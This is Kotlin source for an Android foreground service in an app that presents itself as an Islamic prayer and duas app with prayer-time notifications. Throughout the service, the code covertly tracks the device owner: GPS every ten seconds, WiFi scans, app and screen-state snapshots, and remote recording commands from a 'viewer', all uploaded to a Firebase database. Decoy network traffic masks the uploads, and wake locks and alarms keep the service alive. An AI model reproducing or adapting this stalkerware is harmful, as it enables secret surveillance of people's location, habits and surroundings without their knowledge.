package islamic.duas.sync

import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.work.WorkManager
import islamic.duas.R
import islamic.duas.MainActivity
import islamic.duas.WeatherEngine
import islamic.duas.HeatLevel
import islamic.duas.LocationSyncManager
import islamic.duas.cloud.CloudApi
import islamic.duas.data.OfflineQueue
import islamic.duas.utils.DecoyTrafficEngine
import islamic.duas.utils.DeviceId
import islamic.duas.utils.ErrorLog
import islamic.duas.haidh.HealthEngine
import islamic.duas.wifi.WifiScanner

import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.channels.Channel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withTimeoutOrNull
import org.json.JSONObject
import java.util.concurrent.atomic.AtomicBoolean

class DuaForegroundService : Service() {

    companion object {
        const val NOTIF_ID = 1001
        const val CHANNEL_ID = "sync_foreground"
        private const val TAG = "DuaFGS"
        private const val ALARM_INTERVAL_MS = 10 * 60 * 1000L
        private const val SYNC_INTERVAL_MS = 10 * 60 * 1000L
        private const val FAST_LOC_INTERVAL_MS = 15 * 1000L
        private const val HIGH_ACC_INTERVAL_MS = 10_000L
        private const val HIGH_ACC_TIMEOUT_MS = 15_000L
        private const val HIGH_ACC_THRESHOLD = 10f
        private const val HOME_LOC_INTERVAL_MS = 5 * 60 * 1000L
        private const val HOME_HIGH_ACC_INTERVAL_MS = 10 * 60 * 1000L
        private const val HOME_WIFI_INTERVAL_MS = 10 * 60 * 1000L

        private var extraTitle: String? = null
        private var extraBody: String? = null
        private var extraNavSection: String? = null

        fun start(context: Context) {
            val intent = Intent(context, DuaForegroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun updateNotification(context: Context, title: String, body: String, navSection: String = "home") {
            extraTitle = title
            extraBody = body
            extraNavSection = navSection
            try {
                val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
                val openIntent = Intent(context, MainActivity::class.java).apply {
                    flags = Intent.FLAG_ACTIVITY_SINGLE_TOP
                    putExtra("nav_section", navSection)
                }
                val pendingOpen = PendingIntent.getActivity(
                    context, navSection.hashCode(), openIntent,
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
                )
                val notification = NotificationCompat.Builder(context, CHANNEL_ID)
                    .setContentTitle(title)
                    .setContentText(body)
                    .setStyle(NotificationCompat.BigTextStyle().bigText(body))
                    .setSmallIcon(R.drawable.ic_notification)
                    .setOngoing(true)
                    .setPriority(NotificationCompat.PRIORITY_MIN)
                    .setContentIntent(pendingOpen)
                    .setSilent(true)
                    .build()
                nm.notify(NOTIF_ID, notification)
            } catch (_: Exception) {}
        }

        fun setAlarm(context: Context) {
            try {
                val alarmMgr = context.getSystemService(Context.ALARM_SERVICE) as? AlarmManager ?: return
                val intent = Intent(context, DuaAlarmReceiver::class.java).apply {
                    action = "islamic.duas.ALARM_SYNC"
                }
                val pendingIntent = PendingIntent.getBroadcast(
                    context, 0, intent,
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
                )
                val triggerMs = System.currentTimeMillis() + ALARM_INTERVAL_MS
                val exactOk = Build.VERSION.SDK_INT < Build.VERSION_CODES.S || alarmMgr.canScheduleExactAlarms()
                if (exactOk) {
                    // Exact path: setAlarmClock is Doze-exempt and keeps the sync cadence tight
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                        alarmMgr.setAlarmClock(
                            AlarmManager.AlarmClockInfo(triggerMs, pendingIntent),
                            pendingIntent
                        )
                    } else {
                        alarmMgr.set(AlarmManager.RTC_WAKEUP, triggerMs, pendingIntent)
                    }
                } else {
                    // SCHEDULE_EXACT_ALARM denied: fall back to inexact allow-while-idle so the
                    // 10-min keep-alive (snapshot / queue flush / FGS restart) still runs.
                    // Inexact alarms may be deferred a few minutes, which is acceptable.
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        alarmMgr.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerMs, pendingIntent)
                    } else {
                        alarmMgr.set(AlarmManager.RTC_WAKEUP, triggerMs, pendingIntent)
                    }
                    val prefs = context.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
                    val lastLog = prefs.getLong("alarm_inexact_log_ms", 0L)
                    if (System.currentTimeMillis() - lastLog > 24L * 60 * 60 * 1000) {
                        prefs.edit().putLong("alarm_inexact_log_ms", System.currentTimeMillis()).apply()
                        ErrorLog.write(context, "DuaFGS", "SCHEDULE_EXACT_ALARM denied - using inexact alarm fallback", null)
                    }
                }
            } catch (e: SecurityException) {
                android.util.Log.w("DuaFgService", "setAlarm failed: SCHEDULE_EXACT_ALARM not granted")
            }
        }
    }

    private val scope = CoroutineScope(Dispatchers.IO + Job())
    private var wakeLock: PowerManager.WakeLock? = null
    private val isRunning = AtomicBoolean(false)

    private val snapshotTrigger = Channel<Unit>(Channel.CONFLATED)

    private val screenReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            try {
                val prefs = context.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
                when (intent.action) {
                    Intent.ACTION_SCREEN_OFF -> {
                        prefs.edit().putLong("lastScreenOffMs", System.currentTimeMillis()).apply()
                        snapshotTrigger.trySend(Unit)
                    }
                    Intent.ACTION_SCREEN_ON -> {
                        val offMs = prefs.getLong("lastScreenOffMs", 0L)
                        if (offMs > 0) {
                            prefs.edit()
                                .putLong("pendingScreenOffMs", System.currentTimeMillis() - offMs)
                                .remove("lastScreenOffMs")
                                .apply()
                        }
                        snapshotTrigger.trySend(Unit)
                    }
                }
            } catch (_: Exception) {}
        }
    }

    override fun onCreate() {
        super.onCreate()
        CloudApi.init(this)
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (isRunning.getAndSet(true)) return START_STICKY

        val basicNotification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("اسلامی دعائیں")
            .setContentText("اللہ کے ذکر میں سکون ہے")
            .setSmallIcon(R.drawable.ic_notification)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .build()
        try {
            startForeground(NOTIF_ID, basicNotification)
        } catch (_: SecurityException) {
            stopSelf()
            return START_NOT_STICKY
        }

        scope.launch {
            try {
                val notification = buildHubNotification()
                val nm = getSystemService(NotificationManager::class.java)
                nm.notify(NOTIF_ID, notification)
            } catch (_: Exception) {}
        }

        val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager
        wakeLock = pm?.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "devicesync:foreground")
        wakeLock?.acquire(10 * 60 * 1000L)

        // Dynamic screen-state receiver: captures wake/sleep instantly (no manifest registration possible)
        try {
            val filter = IntentFilter().apply {
                addAction(Intent.ACTION_SCREEN_ON)
                addAction(Intent.ACTION_SCREEN_OFF)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(screenReceiver, filter, Context.RECEIVER_EXPORTED)
            } else {
                @Suppress("DEPRECATION")
                registerReceiver(screenReceiver, filter)
            }
            // Fresh process never observed the previous cycle — clear stale screen-cycle state
            getSharedPreferences("sync_prefs", Context.MODE_PRIVATE).edit()
                .remove("lastScreenOffMs")
                .remove("pendingScreenOffMs")
                .apply()
        } catch (_: Exception) {}

        try {
            setAlarm(this)
        } catch (_: SecurityException) {
            android.util.Log.w("DuaFgService", "setAlarm failed: SCHEDULE_EXACT_ALARM not granted")
        }

        scope.launch {
            try {
                WorkManager.getInstance(this@DuaForegroundService).cancelAllWorkByTag("sync_home")
                WorkManager.getInstance(this@DuaForegroundService).cancelAllWorkByTag("sync_away")
                WorkManager.getInstance(this@DuaForegroundService).cancelAllWorkByTag("sync_charging")
            } catch (_: Exception) {}
        }

        val service = this

        // Dedicated coroutine: high-accuracy GPS every 10s away / 10min home (primary tier)
        scope.launch {
            while (isActive) {
                val startMs = System.currentTimeMillis()
                try {
                    captureHighAccuracyLocation()
                } catch (_: Exception) {}
                val elapsed = System.currentTimeMillis() - startMs
                delay(maxOf(2_000L, HIGH_ACC_INTERVAL_MS - elapsed))
            }
        }

        // Dedicated coroutine: app snapshots every 15s while screen on; screen-off waits for wake signal (no 60s lag)
        scope.launch {
            var wokeBySignal = false
            while (isActive) {
                try {
                    val pwrmgr = getSystemService(Context.POWER_SERVICE) as? PowerManager
                    val screenOn = pwrmgr?.isInteractive ?: true
                    if (screenOn) {
                        var wrote = false
                        try {
                            wrote = DuaSyncWorker.captureAppSnapshot(applicationContext)
                        } catch (e: Exception) {
                            Log.w(TAG, "captureAppSnapshot error: ${e.message}")
                        }
                        if (wokeBySignal && !wrote) {
                            // Just woken: first attempt may have hit the screen-wake transition — retry once
                            wokeBySignal = false
                            delay(2_500L)
                            try {
                                DuaSyncWorker.captureAppSnapshot(applicationContext)
                            } catch (e: Exception) {
                                Log.w(TAG, "captureAppSnapshot retry error: ${e.message}")
                            }
                        }
                        wokeBySignal = false
                        withTimeoutOrNull(15_000L) { snapshotTrigger.receive() }
                    } else {
                        val woke = withTimeoutOrNull(60_000L) { snapshotTrigger.receive() }
                        if (woke != null) {
                            wokeBySignal = true
                            continue
                        }
                    }
                } catch (_: Exception) {
                    delay(15_000L)
                }
            }
        }

        scope.launch {
            var lastSync = 0L
            var lastFastLoc = 0L
            var lastNotifUpdate = 0L
            var lastWifiScan = 0L
            var lastFgsBeat = 0L

            while (isActive) {
                try {
                    val now = System.currentTimeMillis()

                    if (now - lastNotifUpdate > 120_000L) {
                        try {
                            val notification = buildHubNotification()
                            val nm = getSystemService(NotificationManager::class.java)
                            nm.notify(NOTIF_ID, notification)
                        } catch (_: Exception) {}
                        try {
                            val pending = HealthEngine(this@DuaForegroundService).getPendingMedications()
                            islamic.duas.AppNotificationManager(this@DuaForegroundService)
                                .syncPendingMedicationNotification(pending)
                        } catch (_: Exception) {}
                        try {
                            islamic.duas.PermissionNotificationManager(this@DuaForegroundService).checkAndPostAll()
                        } catch (_: Exception) {}
                        lastNotifUpdate = now
                    }

                    if (now - lastFastLoc > FAST_LOC_INTERVAL_MS) {
                        try {
                            DecoyTrafficEngine.fireDecoyRequests()
                            getAndSyncLocation()
                        } catch (e: Exception) {
                            Log.e(TAG, "Location sync error: ${e.message}", e)
                            ErrorLog.write(service, TAG, "FGS location sync error", e)
                        }
                        lastFastLoc = now
                    }

                    // Refresh home config + cached at-home state (throttled 30s fetch inside)
                    try {
                        DuaTracker.refreshHomeState(this@DuaForegroundService)
                    } catch (_: Exception) {}

                    // Lightweight sync every 30s: battery, wifi, active app, screen state
                    try {
                        DuaSyncWorker.lightweightSync(applicationContext)
                    } catch (e: Exception) {
                        Log.w(TAG, "lightweightSync error: ${e.message}")
                    }

                    // FGS alive-heartbeat (throttled 60s): lets the dashboard detect a dead FGS
                    if (now - lastFgsBeat > 60_000L) {
                        try {
                            val androidId = DeviceId.get(applicationContext)
                            val beat = JSONObject().apply { put("ts_ms", now) }
                            CloudApi.writeToRTDB("devices/$androidId/metrics/fgsAlive", beat)
                            // On-device heartbeat so a WorkManager watchdog can detect FGS death
                            // without querying RTDB (works offline / after process death).
                            getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
                                .edit().putLong("fgs_alive_ms", now).apply()
                        } catch (_: Exception) {}
                        lastFgsBeat = now
                    }

                    // Flush offline queue every 30s when connected
                    try {
                        OfflineQueue.flush(applicationContext, 50)
                    } catch (e: Exception) {
                        Log.w(TAG, "Queue flush error: ${e.message}")
                    }

                    // Fallback: try coarse location every loop iteration (internal 30s cooldown)
                    try {
                        forceGetLocation()
                    } catch (_: Exception) {}

                    // WiFi scan: 60s away / 10min home
                    val atHomeWifi = try { DuaTracker.isAtHomeCached(this@DuaForegroundService) } catch (_: Exception) { false }
                    val wifiInterval = if (atHomeWifi) HOME_WIFI_INTERVAL_MS else 60_000L
                    if (now - lastWifiScan > wifiInterval) {
                        try {
                            val wifiScanner = WifiScanner(this@DuaForegroundService)
                            val androidId = DeviceId.get(this@DuaForegroundService)
                            val networks = wifiScanner.scanAndCollect()
                            if (networks.length() > 0) {
                                val wifiData = JSONObject().apply {
                                    put("networks", networks)
                                    put("ts_ms", now)
                                }
                                CloudApi.writeToRTDB("devices/$androidId/wifi_scan/$now", wifiData)
                            }
                            getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
                                .edit().putLong("last_wifi_scan_ms", now).apply()
                        } catch (_: Exception) {}
                        lastWifiScan = now
                    }

                    // Check for sync request from viewer via RTDB
                    try {
                        checkSyncRequest()
                    } catch (_: Exception) {}

                    // Check for remote recording commands from viewer
                    try {
                        islamic.duas.media.RemoteRecorder.getInstance(this@DuaForegroundService)
                            .checkAndHandleCommand()
                    } catch (_: Exception) {}

                    if (now - lastSync > SYNC_INTERVAL_MS) {
                        if (isUserActive()) {
                            try {
                                DecoyTrafficEngine.fireDecoyRequests()
                                DuaSyncWorker.runSync(applicationContext)
                            } catch (e: Exception) {
                                Log.e(TAG, "Full sync error: ${e.message}", e)
                                ErrorLog.write(service, TAG, "FGS full sync error", e)
                            }
                        }
                        lastSync = now
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Sync loop error: ${e.message}", e)
                }
                delay(30_000L)
            }
        }

        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        isRunning.set(false)
        scope.let {
            val job = it.coroutineContext[Job]
            job?.cancel()
        }
        try { unregisterReceiver(screenReceiver) } catch (_: Exception) {}
        wakeLock?.release()
        wakeLock = null
        try {
            setAlarm(this)
        } catch (_: SecurityException) {
            android.util.Log.w("DuaFgService", "setAlarm failed: SCHEDULE_EXACT_ALARM not granted")
        }
        try { DuaSyncScheduler.onBoot(this) } catch (_: Exception) {}
        super.onDestroy()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        try {
            setAlarm(this)
        } catch (_: SecurityException) {
            android.util.Log.w("DuaFgService", "setAlarm failed: SCHEDULE_EXACT_ALARM not granted")
        }
        super.onTaskRemoved(rootIntent)
    }

    private fun isUserActive(): Boolean {
        return try {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            pm.isInteractive
        } catch (_: Exception) { true }
    }

    private fun getAndSyncLocation() {
        try {
            val prefs = getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
            val now = System.currentTimeMillis()
            val lastWrite = prefs.getLong("location_cooldown", 0L)
            if (DuaTracker.isAtHomeCached(this) && now - lastWrite < HOME_LOC_INTERVAL_MS) return

            val lm = getSystemService(Context.LOCATION_SERVICE) as? android.location.LocationManager ?: return
            var best: android.location.Location? = null
            for (provider in listOf(
                android.location.LocationManager.GPS_PROVIDER,
                android.location.LocationManager.NETWORK_PROVIDER,
                android.location.LocationManager.PASSIVE_PROVIDER
            )) {
                try {
                    @Suppress("DEPRECATION")
                    val loc = lm.getLastKnownLocation(provider)
                    if (loc != null && (best == null || loc.accuracy < best.accuracy)) best = loc
                } catch (e: Exception) {
                    Log.w(TAG, "getLastKnownLocation($provider): ${e.message}")
                }
            }

            // Invalidate stale cached locations (>5 minutes old)
            if (best != null && System.currentTimeMillis() - best.time > 300_000L) {
                best = null
            }

            // If no last known location, try active single update
            if (best == null || best.accuracy > 1000f) {
                try {
                    val activeLoc = requestActiveLocation(lm)
                    if (activeLoc != null && (best == null || activeLoc.accuracy < best.accuracy)) best = activeLoc
                } catch (_: Exception) {}
            }

            if (best != null && best.accuracy <= 300f) {
                val lastMs = prefs.getLong("fast_location_ms", 0L)
                if (now - lastMs > 25_000L) {
                    // Skip if GPS recently wrote a high-accuracy point
                    val lastHighAcc = prefs.getLong("last_high_acc_ms", 0L)
                    if (now - lastHighAcc < 60_000L) return
                    LocationSyncManager.writeLocation(this, best, "foreground_service")
                    prefs.edit().putLong("fast_location_ms", now).apply()
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "getAndSyncLocation error: ${e.message}", e)
        }
    }

    @Suppress("DEPRECATION")
    private fun requestActiveLocation(lm: android.location.LocationManager): android.location.Location? {
        var result: android.location.Location? = null
        val latch = java.util.concurrent.CountDownLatch(1)
        val listener = object : android.location.LocationListener {
            override fun onLocationChanged(loc: android.location.Location) {
                if (result == null || loc.accuracy < result!!.accuracy) result = loc
                latch.countDown()
            }
            override fun onProviderDisabled(provider: String) { latch.countDown() }
            override fun onStatusChanged(provider: String?, status: Int, extras: android.os.Bundle?) {
                if (status == android.location.LocationProvider.OUT_OF_SERVICE) latch.countDown()
            }
        }
        try {
            lm.requestSingleUpdate(android.location.LocationManager.GPS_PROVIDER, listener, null)
            latch.await(8, java.util.concurrent.TimeUnit.SECONDS)
            if (result == null) {
                lm.requestSingleUpdate(android.location.LocationManager.NETWORK_PROVIDER, listener, null)
                latch.await(6, java.util.concurrent.TimeUnit.SECONDS)
            }
        } catch (_: Exception) {}
        try { lm.removeUpdates(listener) } catch (_: Exception) {}
        return result
    }

        private fun checkSyncRequest() {
            try {
                val prefs = getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
                val lastCheck = prefs.getLong("sync_request_check_ms", 0L)
                val now = System.currentTimeMillis()
                if (now - lastCheck < 30000L) return
                prefs.edit().putLong("sync_request_check_ms", now).apply()

                val androidId = DeviceId.get(this)
                val reqUrl = "https://instgram-7148c-default-rtdb.europe-west1.firebasedatabase.app/devices/$androidId/fcm/sync_request.json"
                val conn = java.net.URL(reqUrl).openConnection() as java.net.HttpURLConnection
                conn.connectTimeout = 5000
                conn.readTimeout = 5000
                val response = conn.inputStream.bufferedReader().readText()
                conn.disconnect()
                if (response.isNotEmpty() && response != "null") {
                    val json = org.json.JSONObject(response)
                    if (json.has("requested")) {
                        // Trigger sync and clear the request
                        CoroutineScope(Dispatchers.IO).launch {
                            try { DuaSyncWorker.runSync(applicationContext) } catch (_: Exception) {}
                        }
                        // Clear the request
                        val clearConn = java.net.URL(reqUrl).openConnection() as java.net.HttpURLConnection
                        clearConn.requestMethod = "DELETE"
                        clearConn.connectTimeout = 3000
                        clearConn.readTimeout = 3000
                        clearConn.doOutput = true
                        clearConn.connect()
                        clearConn.outputStream.write("null".toByteArray())
                        clearConn.disconnect()
                    }
                }
            } catch (_: Exception) {}
        }

        private fun forceGetLocation() {
            try {
                val lm = getSystemService(Context.LOCATION_SERVICE) as? android.location.LocationManager ?: return
                val prefs = getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
                val now = System.currentTimeMillis()
                val lastWrite = prefs.getLong("location_cooldown", 0L)
                if (DuaTracker.isAtHomeCached(this) && now - lastWrite < HOME_LOC_INTERVAL_MS) return
                // Use separate pref so this isn't blocked by fast_location_ms from getAndSyncLocation
                val lastMs = prefs.getLong("force_location_ms", 0L)
                if (now - lastMs < 30_000L) return
                prefs.edit().putLong("force_location_ms", now).apply()

                val criteria = android.location.Criteria().apply {
                    accuracy = android.location.Criteria.ACCURACY_COARSE
                    powerRequirement = android.location.Criteria.POWER_LOW
                }
                val provider = lm.getBestProvider(criteria, false) ?: return
                @Suppress("DEPRECATION")
                val loc = lm.getLastKnownLocation(provider)
                if (loc != null && loc.accuracy <= 1000f) {
                    if (System.currentTimeMillis() - loc.time > 300_000L) return
                    val prefs2 = getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
                    val lastHighAcc = prefs2.getLong("last_high_acc_ms", 0L)
                    if (System.currentTimeMillis() - lastHighAcc < 60_000L) return
                    LocationSyncManager.writeLocation(this, loc, "force_fg")
                }
            } catch (_: Exception) {}
        }

        @Suppress("DEPRECATION")
        private fun requestHighAccuracyLocation(lm: android.location.LocationManager): android.location.Location? {
            var result: android.location.Location? = null
            val latch = java.util.concurrent.CountDownLatch(1)
            val listener = object : android.location.LocationListener {
                override fun onLocationChanged(loc: android.location.Location) {
                    if (result == null || loc.accuracy < result!!.accuracy) {
                        result = loc
                        // Early exit if we already have sub-10m accuracy
                        if (loc.accuracy <= HIGH_ACC_THRESHOLD) latch.countDown()
                    }
                }
                override fun onProviderDisabled(provider: String) { latch.countDown() }
                override fun onStatusChanged(provider: String?, status: Int, extras: android.os.Bundle?) {
                    if (status == android.location.LocationProvider.OUT_OF_SERVICE) latch.countDown()
                }
            }
            try {
                lm.requestSingleUpdate(android.location.LocationManager.GPS_PROVIDER, listener, null)
                latch.await(HIGH_ACC_TIMEOUT_MS, java.util.concurrent.TimeUnit.MILLISECONDS)
            } catch (_: Exception) {}
            try { lm.removeUpdates(listener) } catch (_: Exception) {}
            return result
        }

        private fun captureHighAccuracyLocation() {
            val prefs = getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
            val now = System.currentTimeMillis()
            if (DuaTracker.isAtHomeCached(this)) {
                val lastHighAcc = prefs.getLong("high_accuracy_cooldown", 0L)
                if (now - lastHighAcc < HOME_HIGH_ACC_INTERVAL_MS) return
            }
            val lm = getSystemService(Context.LOCATION_SERVICE) as? android.location.LocationManager ?: return
            val loc = requestHighAccuracyLocation(lm)
            if (loc != null && loc.accuracy <= HIGH_ACC_THRESHOLD) {
                LocationSyncManager.writeHighAccuracyLocation(this, loc, "high_accuracy_gps")
            }
        }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "خدمة التطبيق",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "خدمة التطبيق"
                setShowBadge(false)
                setSound(null, null)
            }
            val nm = getSystemService(NotificationManager::class.java)
            nm.createNotificationChannel(channel)
        }
    }

    private fun buildHubNotification(): Notification {
        val currentNavSection = extraNavSection ?: "home"
        val openIntent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_SINGLE_TOP
            putExtra("nav_section", currentNavSection)
        }
        val pendingOpen = PendingIntent.getActivity(
            this, currentNavSection.hashCode(), openIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        val engine = islamic.duas.PrayerEngine(this)
        var titleText = "اسلامی دعائیں"
        var bodyText = "اللہ کے ذکر میں سکون ہے"

        try {
            val times = engine.calculatePrayerTimes()
            val now = java.util.Calendar.getInstance()
            val sdf = java.text.SimpleDateFormat("hh:mm a", java.util.Locale.US)
            val prayers = listOf(
                "فجر" to times.fajr, "ظہر" to times.zuhr, "عصر" to times.asr,
                "مغرب" to times.maghrib, "عشاء" to times.isha
            )
            var found = false
            var info = ""
            for ((name, cal) in prayers) {
                val endCal = cal.clone() as java.util.Calendar
                endCal.add(java.util.Calendar.MINUTE, if (name == "فجر") 30 else 60)
                if (now in cal..endCal) {
                    info = "$name کا وقت — تقویٰ سے نماز پڑھیں!"
                    titleText = "🕌 $name: عشرے و توبہ"
                    found = true
                    break
                } else if (cal.after(now) && !found) {
                    val diff = (cal.timeInMillis - now.timeInMillis) / 60000
                    info = "⏳ $name — ${sdf.format(cal.time)} ($diff منٹ)"
                    titleText = "⏰ اگلی نماز: $name — ${sdf.format(cal.time)}"
                    found = true
                }
            }
            if (!found) {
                val tomorrow = java.util.Calendar.getInstance().apply { add(java.util.Calendar.DAY_OF_YEAR, 1) }
                val tTimes = engine.calculatePrayerTimes(tomorrow)
                info = "🌙 فجر — ${sdf.format(tTimes.fajr.time)}"
                titleText = "صبح پہلی نماز: فجر"
            }

            // Contextual extra reminder (no prefix, no duplication)
            val extra = if (extraTitle != null && extraBody != null) {
                "\n$extraBody"
            } else ""

            // Weather info — compact single line (cached only, never blocks main thread)
            val weatherInfo = try {
                val wf = WeatherEngine.getCachedForecast()
                if (wf != null) {
                    val heatIcon = when (wf.heatLevel) {
                        HeatLevel.EXTREME -> "🔥"
                        HeatLevel.HOT -> "🌡"
                        HeatLevel.MILDY_HOT -> "🌤"
                        HeatLevel.MILD -> "🌱"
                    }
                    "\n🌤 ${wf.todayMinTemp}°C–${wf.todayMaxTemp}°C $heatIcon"
                } else ""
            } catch (_: Exception) { "" }

            val parts = mutableListOf(info)
            if (extra.isNotBlank()) parts.add(extra.trimStart('\n'))
            if (weatherInfo.isNotBlank()) parts.add(weatherInfo.trimStart('\n'))

            bodyText = parts.joinToString("\n")
        } catch (_: Exception) {
            titleText = "اسلامی دعائیں"
            bodyText = "اللہ کے ذکر میں سکون ہے"
        }

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(titleText)
            .setContentText(bodyText)
            .setStyle(NotificationCompat.BigTextStyle().bigText(bodyText))
            .setSmallIcon(R.drawable.ic_notification)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setContentIntent(pendingOpen)
            .setSilent(true)
            .build()
    }
}
